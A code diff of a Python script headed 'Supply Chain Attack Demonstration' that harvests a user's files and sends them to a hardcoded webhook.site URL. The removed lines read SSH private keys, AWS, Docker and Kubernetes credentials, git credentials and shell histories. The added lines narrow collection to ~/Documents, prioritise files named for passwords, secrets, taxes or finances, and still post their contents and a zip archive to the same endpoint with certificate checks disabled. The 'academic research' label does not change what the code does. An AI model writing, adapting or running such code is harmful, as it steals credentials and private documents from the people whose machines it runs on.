@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ACADEMIC RESEARCH: Supply Chain Attack Demonstration
-Focused implementation targeting specific user and configuration directories
+Focused implementation targeting only the Documents directory
 """
 
 import os
@@ -20,8 +20,6 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import logging
 import time
-import socket
-import ssl
 
 # Configure logging
 logging.basicConfig(
@@ -36,7 +34,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class SecureDataTransmitter:
-    """Robust data transmitter with SSL error handling and retry mechanisms"""
+    """Robust data transmitter with SSL error handling"""
     
     def __init__(self, max_retries: int = 3, timeout: int = 30):
         self.max_retries = max_retries
@@ -44,127 +42,71 @@ class SecureDataTransmitter:
         self.session = self._create_secure_session()
     
     def _create_secure_session(self) -> requests.Session:
-        """Create a requests session with proper error handling and retries"""
+        """Create a requests session with proper error handling"""
         session = requests.Session()
         
-        # Enhanced retry strategy
         retry_strategy = Retry(
             total=self.max_retries,
             backoff_factor=1,
             status_forcelist=[429, 500, 502, 503, 504],
-            allowed_methods=["POST", "GET", "PUT"],
+            allowed_methods=["POST"],
             raise_on_status=False
         )
         
-        # HTTP adapter configuration with timeout settings
         adapter = HTTPAdapter(
             max_retries=retry_strategy,
             pool_connections=5,
-            pool_maxsize=10,
-            pool_block=False
+            pool_maxsize=10
         )
         
         session.mount("http://", adapter)
         session.mount("https://", adapter)
         
-        # Set default headers
         session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (compatible; SecureResearchAgent/1.0)',
-            'Content-Type': 'application/json',
-            'Accept': 'application/json',
-            'Connection': 'close'
+            'User-Agent': 'Research-Agent/1.0',
+            'Content-Type': 'application/json'
         })
         
         return session
     
-    def transmit_data(self, url: str, data: dict = None, files: dict = None,
-                     verify_ssl: bool = False, headers: dict = None) -> dict:
-        """
-        Transmit data with robust error handling
-        """
-        # Validate and format URL
+    def transmit_data(self, url: str, data: dict = None, files: dict = None) -> dict:
+        """Transmit data with robust error handling"""
+        
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
         
-        # Prepare headers
-        request_headers = self.session.headers.copy()
-        if headers:
-            request_headers.update(headers)
-        
         try:
-            # Calculate data size for logging
-            data_size = len(json.dumps(data).encode('utf-8')) if data else 0
-            logger.info(f"[SECURE-TRANSMIT] Sending {data_size} bytes to {url}")
-            
             if files:
-                # File upload with different timeout
                 response = self.session.post(
                     url,
                     files=files,
-                    verify=verify_ssl,
-                    timeout=(10, 30),
-                    headers=request_headers
+                    verify=False,
+                    timeout=(10, 30)
                 )
             else:
-                # JSON data transmission
                 response = self.session.post(
                     url,
                     json=data,
-                    verify=verify_ssl,
-                    timeout=(10, 25),
-                    headers=request_headers
+                    verify=False,
+                    timeout=(10, 25)
                 )
             
             response.raise_for_status()
-            logger.info(f"[SECURE-TRANSMIT] Transmission successful: HTTP {response.status_code}")
             return {
                 'success': True,
-                'status_code': response.status_code,
-                'response_text': response.text[:200],
-                'response_size': len(response.text)
+                'status_code': response.status_code
             }
             
         except requests.exceptions.SSLError as e:
-            logger.error(f"[SECURE-TRANSMIT] SSL Error: {e}")
-            
-            # Fallback: Try without SSL verification
-            logger.info("[SECURE-TRANSMIT] Attempting fallback without SSL verification...")
-            try:
-                if files:
-                    response = self.session.post(
-                        url,
-                        files=files,
-                        verify=False,
-                        timeout=(15, 30),
-                        headers=request_headers
-                    )
-                else:
-                    response = self.session.post(
-                        url,
-                        json=data,
-                        verify=False,
-                        timeout=(15, 25),
-                        headers=request_headers
-                    )
-                
-                response.raise_for_status()
-                logger.info(f"[SECURE-TRANSMIT] Fallback transmission successful: HTTP {response.status_code}")
-                return {
-                    'success': True,
-                    'status_code': response.status_code,
-                    'response_text': response.text[:200],
-                    'fallback_used': True
-                }
-            except Exception as fallback_error:
-                logger.error(f"[SECURE-TRANSMIT] Fallback also failed: {fallback_error}")
-                return {
-                    'success': False,
-                    'error': f"SSL Error and fallback failed: {fallback_error}",
-                    'error_type': 'ssl_fallback_failed'
-                }
+            logger.error(f"SSL Error: {e}")
+            return {
+                'success': False,
+                'error': f"SSL Error: {e}",
+                'error_type': 'ssl_error'
+            }
             
         except requests.exceptions.ConnectionError as e:
-            logger.error(f"[SECURE-TRANSMIT] Connection Error: {e}")
+            logger.error(f"Connection Error: {e}")
             return {
                 'success': False,
                 'error': f"Connection Error: {e}",
@@ -172,37 +114,19 @@ class SecureDataTransmitter:
             }
             
         except requests.exceptions.Timeout as e:
-            logger.error(f"[SECURE-TRANSMIT] Timeout Error: {e}")
+            logger.error(f"Timeout Error: {e}")
             return {
                 'success': False,
                 'error': f"Timeout Error: {e}",
                 'error_type': 'timeout_error'
             }
             
-        except requests.exceptions.HTTPError as e:
-            status_code = e.response.status_code if e.response else 'Unknown'
-            logger.error(f"[SECURE-TRANSMIT] HTTP Error {status_code}: {e}")
-            return {
-                'success': False,
-                'error': f"HTTP Error {status_code}: {e}",
-                'error_type': 'http_error',
-                'status_code': status_code
-            }
-            
-        except requests.exceptions.RequestException as e:
-            logger.error(f"[SECURE-TRANSMIT] Request Error: {e}")
-            return {
-                'success': False,
-                'error': f"Request Error: {e}",
-                'error_type': 'request_error'
-            }
-            
         except Exception as e:
-            logger.error(f"[SECURE-TRANSMIT] Unexpected Error: {e}")
+            logger.error(f"Transmission Error: {e}")
             return {
                 'success': False,
-                'error': f"Unexpected Error: {e}",
-                'error_type': 'unexpected_error'
+                'error': f"Transmission Error: {e}",
+                'error_type': 'general_error'
             }
     
     def close(self):
@@ -211,8 +135,8 @@ class SecureDataTransmitter:
             self.session.close()
 
 
-class SupplyChainAttackResearch:
-    """Academic demonstration of supply chain attack methods focused on specific directories."""
+class DocumentsResearch:
+    """Academic research focused solely on Documents directory"""
     
     def __init__(self):
         self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
@@ -220,99 +144,45 @@ class SupplyChainAttackResearch:
         self.file_contents = {}
         self.transmitter = SecureDataTransmitter(max_retries=2, timeout=20)
     
-    def collect_environment_data(self):
-        """Collect comprehensive system and environment information."""
-        print("[RESEARCH] Collecting environment data...")
+    def collect_system_info(self):
+        """Collect basic system information"""
+        print("[RESEARCH] Collecting system information...")
         
-        home_dir = Path.home()
-        self.collected_data['environment'] = {
-            'system_info': {
-                'platform': platform.platform(),
-                'python_version': platform.python_version(),
-                'python_full_version': sys.version,
-                'user': os.getenv('USER'),
-                'home_directory': str(home_dir),
-                'current_directory': str(Path.cwd()),
-                'hostname': platform.node(),
-                'processor': platform.processor(),
-                'machine': platform.machine()
-            },
-            'environment_vars': {
-                'OPENAI_API_KEY': bool(os.getenv('OPENAI_API_KEY')),
-                'AWS_ACCESS_KEY_ID': bool(os.getenv('AWS_ACCESS_KEY_ID')),
-                'GITHUB_TOKEN': bool(os.getenv('GITHUB_TOKEN')),
-                'DOCKER_CONFIG': bool(os.getenv('DOCKER_CONFIG')),
-                'KUBECONFIG': bool(os.getenv('KUBECONFIG')),
-                'PATH': os.getenv('PATH')
-            },
-            'research_info': {
-                'timestamp': self.get_timestamp(),
-                'script_name': os.path.basename(__file__),
-                'working_directory': os.getcwd(),
-                'target_directories': [
-                    "Documents", "Downloads", "Desktop",
-                    ".ssh", ".aws", ".config", ".docker", ".kube", ".local", ".cache",
-                    "Recent", "tmp"
-                ]
-            }
+        self.collected_data['system_info'] = {
+            'platform': platform.platform(),
+            'python_version': platform.python_version(),
+            'user': os.getenv('USER'),
+            'home_directory': str(Path.home()),
+            'current_directory': str(Path.cwd()),
+            'hostname': platform.node(),
+            'timestamp': datetime.now().isoformat()
         }
         
-        return self.collected_data['environment']
+        return self.collected_data['system_info']
     
-    def scan_target_directories(self):
-        """Scan only the specified target directories for valuable data."""
-        print("[RESEARCH] Scanning target directories...")
+    def scan_documents_directory(self):
+        """Scan only the Documents directory"""
+        print("[RESEARCH] Scanning Documents directory...")
         
-        home_dir = Path.home()
-        target_directories = [
-            # User directories
-            home_dir / "Documents",
-            home_dir / "Downloads", 
-            home_dir / "Desktop",
-
-            # Configuration directories
-            home_dir / ".ssh",
-            home_dir / ".aws",
-            home_dir / ".config",
-            home_dir / ".docker",
-            home_dir / ".kube",
-            home_dir / ".local",
-            home_dir / ".cache",
-
-            # Temporary and recent
-            home_dir / "Recent",
-            home_dir / "tmp",
-        ]
+        documents_dir = Path.home() / "Documents"
         
-        target_scan_results = {}
+        if not documents_dir.exists() or not documents_dir.is_dir():
+            print("  - Documents directory not found")
+            self.collected_data['documents'] = {"exists": False}
+            return {"exists": False}
         
-        for target_dir in target_directories:
-            if target_dir.exists() and target_dir.is_dir():
-                print(f"  - Scanning: {target_dir}")
-                dir_info = self.scan_directory(target_dir)
-                target_scan_results[str(target_dir)] = dir_info
-            else:
-                target_scan_results[str(target_dir)] = {"exists": False}
-        
-        self.collected_data['target_directories'] = target_scan_results
-        return target_scan_results
-    
-    def scan_directory(self, directory_path, max_files=50):
-        """Scan a specific directory and collect comprehensive file information."""
         dir_info = {
             'exists': True,
             'file_count': 0,
             'total_size': 0,
             'files': [],
             'file_types': {},
-            'notable_files': [],
-            'largest_files': [],
-            'recent_files': []
+            'notable_files': []
         }
         
         try:
             all_files = []
-            for item in directory_path.rglob('*'):
+            for item in documents_dir.rglob('*'):
                 if item.is_file():
                     try:
                         stat = item.stat()
@@ -321,223 +191,99 @@ class SupplyChainAttackResearch:
                             'name': item.name,
                             'size': stat.st_size,
                             'modified': stat.st_mtime,
-                            'created': stat.st_ctime,
                             'extension': item.suffix.lower(),
-                            'is_notable': self.is_notable_file(item),
-                            'type': self.classify_file_type(item)
+                            'is_notable': self.is_notable_file(item)
                         }
                         all_files.append(file_info)
                     except (OSError, PermissionError):
                         continue
-                # Limit for performance
-                if len(all_files) >= max_files * 2:
+                
+                if len(all_files) >= 100:  # Limit for performance
                     break
             
-            # Sort and limit files
-            all_files.sort(key=lambda x: x['size'], reverse=True)
-            dir_info['files'] = all_files[:max_files]
+            dir_info['files'] = all_files[:50]  # Keep top 50 files
             dir_info['file_count'] = len(all_files)
-            dir_info['total_size'] = sum(f['size'] for f in all_files[:max_files])
+            dir_info['total_size'] = sum(f['size'] for f in all_files[:50])
             
             # Analyze file types
-            for file_info in all_files[:max_files]:
+            for file_info in all_files[:50]:
                 ext = file_info['extension']
                 dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
             
             # Identify notable files
             dir_info['notable_files'] = [f for f in all_files if f['is_notable']][:10]
             
-            # Get largest files
-            dir_info['largest_files'] = all_files[:5]
+            print(f"  - Found {len(all_files)} files, {dir_info['total_size']:,} bytes")
             
-            # Get recent files (last 7 days)
-            recent_cutoff = datetime.now().timestamp() - (7 * 24 * 60 * 60)
-            dir_info['recent_files'] = [f for f in all_files if f['modified'] > recent_cutoff][:5]
-                        
         except Exception as e:
             dir_info['error'] = str(e)
+            print(f"  - Error scanning Documents: {e}")
         
+        self.collected_data['documents'] = dir_info
         return dir_info
     
     def is_notable_file(self, file_path):
-        """Check if a file is potentially interesting/valuable."""
+        """Check if a file is potentially interesting"""
+        notable_extensions = {
+            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.txt', '.rtf', '.odt', '.ods', '.odp',
+            '.json', '.xml', '.yaml', '.yml', '.csv',
+            '.zip', '.tar', '.gz', '.7z', '.rar'
+        }
+        
         notable_patterns = [
-            # Code and projects
-            '.git', '.py', '.js', '.java', '.cpp', '.c', '.go', '.rs', '.php', '.html', '.css',
-            # Configurations
-            '.env', 'config', 'settings', 'credentials', 'key', 'cert', 'pem', 'pfx', 'p12',
-            # Documents
-            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods',
-            # Data
-            '.json', '.xml', '.yaml', '.yml', '.csv', '.db', '.sql', '.sqlite', '.mdb',
-            # Archives
-            '.zip', '.tar', '.gz', '.7z', '.rar', '.bz2',
-            # Logs and backups
-            '.log', '.bak', '.backup',
-            # Security
-            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'known_hosts', 'authorized_keys',
-            # Cloud credentials
-            'credentials', 'config', 'aws', 'gcloud', 'kubeconfig'
+            'password', 'secret', 'config', 'credential', 'key',
+            'backup', 'financial', 'tax', 'invoice', 'contract'
         ]
         
         name_lower = file_path.name.lower()
-        return any(pattern in name_lower for pattern in notable_patterns)
-    
-    def classify_file_type(self, file_path):
-        """Classify the type of file for analysis."""
-        name = file_path.name.lower()
-        suffix = file_path.suffix.lower()
         
-        if '.git' in name or name in ['.gitignore', '.gitconfig', '.gitmodules']:
-            return 'git_config'
-        elif any(key in name for key in ['key', 'pem', 'cert', 'credential', 'secret', 'token']):
-            return 'security_credential'
-        elif any(conf in name for conf in ['config', 'setting', '.env', 'properties', 'ini']):
-            return 'configuration'
-        elif suffix in ['.py', '.js', '.java', '.cpp', '.c', '.go', '.rs', '.php', '.rb', '.pl']:
-            return 'source_code'
-        elif suffix in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']:
-            return 'document'
-        elif suffix in ['.db', '.sql', '.sqlite', '.mdb', '.accdb']:
-            return 'database'
-        elif suffix in ['.zip', '.tar', '.gz', '.7z', '.rar']:
-            return 'archive'
-        elif suffix in ['.log']:
-            return 'log_file'
-        else:
-            return 'other'
-    
-    def scan_workspace(self):
-        """Scan and collect current workspace file information."""
-        print("[RESEARCH] Scanning workspace files...")
+        # Check extension
+        if file_path.suffix.lower() in notable_extensions:
+            return True
         
-        workspace_files = []
-        total_size = 0
+        # Check filename patterns
+        if any(pattern in name_lower for pattern in notable_patterns):
+            return True
         
-        try:
-            for item in Path('.').rglob('*'):
-                if item.is_file():
-                    try:
-                        stat = item.stat()
-                        file_info = {
-                            'path': str(item),
-                            'name': item.name,
-                            'size': stat.st_size,
-                            'modified': stat.st_mtime,
-                            'created': stat.st_ctime,
-                            'extension': item.suffix.lower(),
-                            'is_notable': self.is_notable_file(item),
-                            'type': self.classify_file_type(item)
-                        }
-                        workspace_files.append(file_info)
-                        total_size += stat.st_size
-                    except (OSError, PermissionError):
-                        continue
-                # Limit for performance
-                if len(workspace_files) >= 50:
-                    break
-        except Exception as e:
-            workspace_files.append({'error': str(e)})
-        
-        self.collected_data['workspace'] = {
-            'file_count': len(workspace_files),
-            'total_size': total_size,
-            'files': workspace_files[:25],
-            'file_types': {},
-            'notable_files': [f for f in workspace_files if f.get('is_notable')][:5],
-            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code'][:5]
-        }
-        
-        # Analyze file types
-        for file_info in workspace_files[:25]:
-            ext = file_info['extension']
-            self.collected_data['workspace']['file_types'][ext] = \
-                self.collected_data['workspace']['file_types'].get(ext, 0) + 1
-        
-        return self.collected_data['workspace']
+        return False
     
     def collect_file_contents(self):
-        """Collect actual file contents from sensitive and notable files in target directories."""
-        print("[RESEARCH] Collecting file contents from target directories...")
+        """Collect contents of notable files from Documents directory"""
+        print("[RESEARCH] Collecting file contents...")
         
-        home_dir = Path.home()
-        target_files = [
-            # SSH configuration files
-            (home_dir / ".ssh" / "id_rsa", 10000),
-            (home_dir / ".ssh" / "id_rsa.pub", 5000),
-            (home_dir / ".ssh" / "id_dsa", 10000),
-            (home_dir / ".ssh" / "id_ecdsa", 10000),
-            (home_dir / ".ssh" / "id_ed25519", 10000),
-            (home_dir / ".ssh" / "config", 5000),
-            (home_dir / ".ssh" / "known_hosts", 10000),
-            (home_dir / ".ssh" / "authorized_keys", 5000),
-            
-            # AWS configuration files
-            (home_dir / ".aws" / "credentials", 5000),
-            (home_dir / ".aws" / "config", 5000),
-            
-            # Docker configuration
-            (home_dir / ".docker" / "config.json", 10000),
-            
-            # Kubernetes configuration
-            (home_dir / ".kube" / "config", 15000),
-            
-            # Shell configurations
-            (home_dir / ".bashrc", 5000),
-            (home_dir / ".bash_profile", 5000),
-            (home_dir / ".zshrc", 5000),
-            (home_dir / ".bash_history", 15000),
-            (home_dir / ".zsh_history", 15000),
-            
-            # Git configurations
-            (home_dir / ".gitconfig", 5000),
-            (home_dir / ".git-credentials", 5000),
-            
-            # Recent documents (common locations)
-            (home_dir / "Recent" / "index.tree", 10000),
-            (home_dir / "Recent" / "autostart", 5000),
-            
-            # Temporary directory notable files
-            (home_dir / "tmp" / ".X0-lock", 1000),
-            (home_dir / "tmp" / ".X11-unix", 1000),
-            
-            # Workspace configuration files
-            (Path(".") / ".env", 5000),
-            (Path(".") / "config.json", 10000),
-            (Path(".") / "settings.py", 10000),
-        ]
+        documents_dir = Path.home() / "Documents"
         
-        # Add notable files from target directories
-        target_dirs = [
-            home_dir / "Documents",
-            home_dir / "Downloads", 
-            home_dir / "Desktop",
-            home_dir / ".config",
-            home_dir / ".local",
-            home_dir / ".cache"
-        ]
+        if not documents_dir.exists():
+            print("  - Documents directory not found")
+            return {}
         
-        for target_dir in target_dirs:
-            if target_dir.exists():
-                try:
-                    print(f"  - Sampling notable files from: {target_dir}")
-                    notable_files = []
-                    for item in target_dir.rglob('*'):
-                        if item.is_file() and self.is_notable_file(item):
-                            notable_files.append(item)
-                            if len(notable_files) >= 5:  # Limit sampling per directory
-                                break
-                    
-                    for file_path in notable_files[:5]:
-                        target_files.append((file_path, 10000))
-                        print(f"    - Added: {file_path}")
-                        
-                except Exception as e:
-                    print(f"  - Error sampling {target_dir}: {e}")
+        # Get notable files from scan
+        notable_files = []
+        if self.collected_data.get('documents', {}).get('notable_files'):
+            notable_files = self.collected_data['documents']['notable_files']
+        
+        # If no notable files from scan, sample some files
+        if not notable_files:
+            try:
+                for item in documents_dir.rglob('*'):
+                    if item.is_file() and self.is_notable_file(item):
+                        notable_files.append({
+                            'path': str(item),
+                            'name': item.name,
+                            'size': item.stat().st_size
+                        })
+                        if len(notable_files) >= 10:
+                            break
+            except Exception as e:
+                print(f"  - Error sampling files: {e}")
         
         collected_contents = {}
         
-        for file_path, max_size in target_files:
+        for file_info in notable_files[:10]:  # Limit to 10 files
+            file_path = Path(file_info['path'])
+            max_size = 5000  # 5KB limit per file
+            
             if file_path.exists():
                 try:
                     # Try text reading first
@@ -549,239 +295,137 @@ class SupplyChainAttackResearch:
                                 'truncated': len(content) == max_size,
                                 'size': len(content),
                                 'file_size': file_path.stat().st_size,
-                                'encoding': 'text',
-                                'type': self.classify_file_type(file_path),
-                                'hash': hashlib.md5(content.encode('utf-8')).hexdigest()
+                                'encoding': 'text'
                             }
                     except (UnicodeDecodeError, ValueError):
-                        # Fall back to binary reading
-                        with open(file_path, 'rb') as f:
-                            binary_content = f.read(max_size)
-                            # Encode binary content as base64 for transmission
-                            encoded_content = base64.b64encode(binary_content).decode('utf-8')
-                            collected_contents[str(file_path)] = {
-                                'content': encoded_content,
-                                'truncated': len(binary_content) == max_size,
-                                'size': len(binary_content),
-                                'file_size': file_path.stat().st_size,
-                                'encoding': 'base64',
-                                'type': self.classify_file_type(file_path),
-                                'hash': hashlib.md5(binary_content).hexdigest()
-                            }
+                        # Skip binary files for simplicity
+                        collected_contents[str(file_path)] = {
+                            'error': 'Binary file skipped',
+                            'size': file_path.stat().st_size
+                        }
                     
-                    print(f"  - Collected: {file_path} ({collected_contents[str(file_path)]['size']} bytes)")
+                    print(f"  - Collected: {file_path.name} ({collected_contents[str(file_path)]['size']} bytes)")
                     
                 except Exception as e:
                     collected_contents[str(file_path)] = {
-                        'error': str(e),
-                        'exists': True
+                        'error': str(e)
                     }
                     print(f"  - Error reading {file_path}: {e}")
-            else:
-                collected_contents[str(file_path)] = {'exists': False}
         
         self.file_contents = collected_contents
         return collected_contents
     
     def create_archive(self):
-        """Create focused archive of collected data from target directories."""
-        print("[RESEARCH] Creating focused research data archive...")
+        """Create archive of collected data"""
+        print("[RESEARCH] Creating data archive...")
         
-        # Include file contents in the collected data
+        # Include file contents in collected data
         self.collected_data['file_contents'] = {
             'summary': {
                 'total_files': len(self.file_contents),
-                'files_with_content': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
-                'total_content_size': sum(f.get('size', 0) for f in self.file_contents.values() if f.get('exists', True))
+                'files_with_content': len([f for f in self.file_contents.values() if 'error' not in f]),
+                'total_content_size': sum(f.get('size', 0) for f in self.file_contents.values())
             },
             'files': self.file_contents
         }
         
+        # Create JSON file
         with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
             json.dump(self.collected_data, f, indent=2)
             temp_json_path = f.name
         
-        # Create focused ZIP archive
-        archive_path = 'focused_research_data.zip'
+        # Create ZIP archive
+        archive_path = 'documents_research.zip'
         with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            zipf.write(temp_json_path, 'collected_data.json')
-            
-            # Include only key configuration files from target directories
-            for file_path in self.file_contents.keys():
-                if Path(file_path).exists():
-                    try:
-                        zipf.write(file_path, f'collected_files/{Path(file_path).name}')
-                    except Exception:
-                        pass
+            zipf.write(temp_json_path, 'research_data.json')
         
         # Cleanup
         os.unlink(temp_json_path)
         
-        self.collected_data['archive'] = {
-            'path': archive_path,
-            'size': os.path.getsize(archive_path),
-            'file_count': len(zipfile.ZipFile(archive_path).namelist())
-        }
+        archive_size = os.path.getsize(archive_path)
+        print(f"  - Archive created: {archive_size:,} bytes")
         
         return archive_path
     
-    def exfiltrate_data(self, archive_path):
-        """Send focused collected data to research webhook endpoint."""
-        print("[RESEARCH] Sending focused data to research endpoint...")
-        
-        transmission_results = {
-            'metadata_sent': False,
-            'files_sent': 0,
-            'total_files': 0,
-            'archive_sent': False,
-            'errors': []
-        }
+    def transmit_data(self, archive_path):
+        """Transmit collected data"""
+        print("[RESEARCH] Transmitting data...")
         
         try:
-            # Prepare focused metadata
+            # Prepare metadata payload
             metadata_payload = {
-                'research_purpose': 'Focused Supply Chain Security Analysis',
-                'timestamp': self.get_timestamp(),
-                'target_directories': [
-                    "Documents", "Downloads", "Desktop",
-                    ".ssh", ".aws", ".config", ".docker", ".kube", ".local", ".cache",
-                    "Recent", "tmp"
-                ],
+                'research_purpose': 'Documents Directory Analysis',
+                'timestamp': datetime.now().isoformat(),
                 'collection_summary': {
-                    'system_info_collected': True,
-                    'workspace_files': self.collected_data['workspace']['file_count'],
-                    'target_directories_scanned': len([d for d in self.collected_data['target_directories'].values() if d.get('exists')]),
-                    'file_contents_collected': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
-                    'total_data_size': self.collected_data['archive']['size']
+                    'documents_files': self.collected_data['documents'].get('file_count', 0),
+                    'file_contents_collected': len(self.file_contents),
+                    'archive_size': os.path.getsize(archive_path)
                 },
-                'system_info': {
-                    'platform': self.collected_data['environment']['system_info']['platform'],
-                    'python_version': self.collected_data['environment']['system_info']['python_version'],
-                    'user': self.collected_data['environment']['system_info']['user'],
-                    'hostname': self.collected_data['environment']['system_info']['hostname']
-                },
-                'directory_summary': {
-                    dir_path: {
-                        'file_count': data.get('file_count', 0),
-                        'total_size': data.get('total_size', 0),
-                        'notable_files': len(data.get('notable_files', []))
-                    }
-                    for dir_path, data in self.collected_data.get('target_directories', {}).items()
-                    if data.get('exists')
+                'system_info': self.collected_data['system_info'],
+                'documents_summary': {
+                    'file_count': self.collected_data['documents'].get('file_count', 0),
+                    'total_size': self.collected_data['documents'].get('total_size', 0),
+                    'notable_files': len(self.collected_data['documents'].get('notable_files', []))
                 }
             }
             
-            print(f"[RESEARCH] Sending metadata ({len(str(metadata_payload))} bytes)...")
-            
-            # Send metadata using secure transmitter
+            print("  - Sending metadata...")
             metadata_result = self.transmitter.transmit_data(
                 self.webhook_url,
-                data=metadata_payload,
-                headers={
-                    'User-Agent': 'Research-Bot/1.0',
-                    'X-Research-Phase': 'metadata',
-                    'X-Research-Focus': 'targeted-directories'
-                },
-                verify_ssl=False
+                data=metadata_payload
             )
             
-            transmission_results['metadata_sent'] = metadata_result.get('success', False)
-            if not transmission_results['metadata_sent']:
-                transmission_results['errors'].append(f"Metadata failed: {metadata_result.get('error')}")
-            
-            # Send only key file contents (prioritize configuration files)
-            file_transmission_results = {}
-            key_files_to_send = []
-            
-            # Prioritize configuration and credential files
-            priority_types = ['security_credential', 'configuration', 'git_config']
-            
+            # Send file contents
+            files_sent = 0
             for file_path, content_info in self.file_contents.items():
-                if (content_info.get('exists', True) and 'error' not in content_info and 
-                    content_info.get('size', 0) < 8000):  # Only send small files
-                    file_type = content_info.get('type', 'other')
-                    if file_type in priority_types:
-                        key_files_to_send.insert(0, (file_path, content_info))  # Add to beginning
-                    else:
-                        key_files_to_send.append((file_path, content_info))
-            
-            transmission_results['total_files'] = len(key_files_to_send)
-            
-            # Send files with progress and delays
-            for i, (file_path, content_info) in enumerate(key_files_to_send):
-                print(f"[RESEARCH] Sending file {i+1}/{len(key_files_to_send)}: {file_path}")
-                
-                file_payload = {
-                    'file_path': file_path,
-                    'file_content': content_info.get('content', '')[:3000],  # Limit content size
-                    'encoding': content_info.get('encoding', 'text'),
-                    'size': content_info.get('size', 0),
-                    'type': content_info.get('type', 'unknown'),
-                    'timestamp': self.get_timestamp()
-                }
-                
-                file_result = self.transmitter.transmit_data(
-                    self.webhook_url,
-                    data=file_payload,
-                    headers={
-                        'User-Agent': 'Research-Bot/1.0',
-                        'X-Research-Phase': 'file_content',
-                        'X-File-Type': content_info.get('type', 'unknown')
-                    },
-                    verify_ssl=False
-                )
-                
-                file_transmission_results[file_path] = file_result
-                if file_result.get('success'):
-                    transmission_results['files_sent'] += 1
-                
-                # Add delay between file transmissions
-                if i < len(key_files_to_send) - 1:
-                    time.sleep(1.5)
-            
-            # Send archive if it's not too large
-            archive_size = os.path.getsize(archive_path)
-            if archive_size < 3 * 1024 * 1024:  # 3MB limit
-                print("[RESEARCH] Sending archive...")
-                with open(archive_path, 'rb') as f:
-                    archive_result = self.transmitter.transmit_data(
+                if 'error' not in content_info:
+                    file_payload = {
+                        'file_path': file_path,
+                        'file_content': content_info.get('content', ''),
+                        'size': content_info.get('size', 0),
+                        'timestamp': datetime.now().isoformat()
+                    }
+                    
+                    file_result = self.transmitter.transmit_data(
                         self.webhook_url,
-                        files={'file': (os.path.basename(archive_path), f, 'application/zip')},
-                        headers={
-                            'User-Agent': 'Research-Bot/1.0',
-                            'X-Research-Phase': 'archive'
-                        },
-                        verify_ssl=False
+                        data=file_payload
                     )
-                transmission_results['archive_sent'] = archive_result.get('success', False)
-            else:
-                print(f"[RESEARCH] Archive too large to send ({archive_size} bytes)")
-                transmission_results['archive_sent'] = False
+                    
+                    if file_result.get('success'):
+                        files_sent += 1
+                    
+                    time.sleep(1)  # Rate limiting
             
-            print(f"[RESEARCH] Data transmission complete:")
-            print(f"  - Metadata: {'SUCCESS' if transmission_results['metadata_sent'] else 'FAILED'}")
-            print(f"  - Files: {transmission_results['files_sent']}/{transmission_results['total_files']} successful")
-            print(f"  - Archive: {'SUCCESS' if transmission_results['archive_sent'] else 'FAILED'}")
+            # Send archive
+            print("  - Sending archive...")
+            with open(archive_path, 'rb') as f:
+                archive_result = self.transmitter.transmit_data(
+                    self.webhook_url,
+                    files={'file': ('research.zip', f, 'application/zip')}
+                )
             
-            return transmission_results
+            result = {
+                'metadata_sent': metadata_result.get('success', False),
+                'files_sent': files_sent,
+                'total_files': len([f for f in self.file_contents.values() if 'error' not in f]),
+                'archive_sent': archive_result.get('success', False)
+            }
+            
+            print(f"  - Transmission complete:")
+            print(f"    Metadata: {'SUCCESS' if result['metadata_sent'] else 'FAILED'}")
+            print(f"    Files: {result['files_sent']}/{result['total_files']}")
+            print(f"    Archive: {'SUCCESS' if result['archive_sent'] else 'FAILED'}")
+            
+            return result
             
         except Exception as e:
-            error_msg = f"Transmission error: {e}"
-            print(f"[RESEARCH] {error_msg}")
-            transmission_results['errors'].append(error_msg)
-            return transmission_results
-    
-    def get_timestamp(self):
-        """Get current timestamp for logging."""
-        return datetime.now().isoformat()
+            print(f"  - Transmission error: {e}")
+            return {'error': str(e)}
     
     def cleanup(self, archive_path):
-        """Clean up temporary files and resources."""
+        """Clean up resources"""
         try:
-            # Close transmitter
             self.transmitter.close()
-            
-            # Remove archive
             if os.path.exists(archive_path):
                 os.unlink(archive_path)
                 print("[RESEARCH] Cleanup completed")
@@ -790,70 +434,54 @@ class SupplyChainAttackResearch:
 
 
 def main():
-    """Main research execution function."""
-    print("🔬 FOCUSED SUPPLY CHAIN SECURITY RESEARCH")
-    print("=" * 60)
-    print("Research Focus: Targeted directory analysis")
-    print("Target Directories:")
-    print("  - User: Documents, Downloads, Desktop")
-    print("  - Config: .ssh, .aws, .config, .docker, .kube, .local, .cache")
-    print("  - Temp: Recent, tmp")
-    print("Security: Enhanced SSL/TLS handling with timeout management")
-    print("=" * 60)
+    """Main execution function"""
+    print("🔬 DOCUMENTS DIRECTORY RESEARCH")
+    print("=" * 50)
+    print("Research Focus: Documents directory analysis")
+    print("Target: ~/Documents")
+    print("=" * 50)
     
-    researcher = SupplyChainAttackResearch()
+    researcher = DocumentsResearch()
     archive_path = None
     
     try:
-        # Phase 1: Focused Data Collection
-        print("\n[PHASE 1] FOCUSED DATA COLLECTION")
-        env_data = researcher.collect_environment_data()
-        workspace_data = researcher.scan_workspace()
-        target_data = researcher.scan_target_directories()
+        # Data collection
+        print("\n[PHASE 1] DATA COLLECTION")
+        system_info = researcher.collect_system_info()
+        documents_data = researcher.scan_documents_directory()
         file_contents = researcher.collect_file_contents()
         
-        # Phase 2: Data Preparation
+        # Data preparation
         print("\n[PHASE 2] DATA PREPARATION")
         archive_path = researcher.create_archive()
         
-        # Phase 3: Data Transmission
+        # Data transmission
         print("\n[PHASE 3] DATA TRANSMISSION")
-        print("Note: Press Ctrl+C to interrupt transmission at any time")
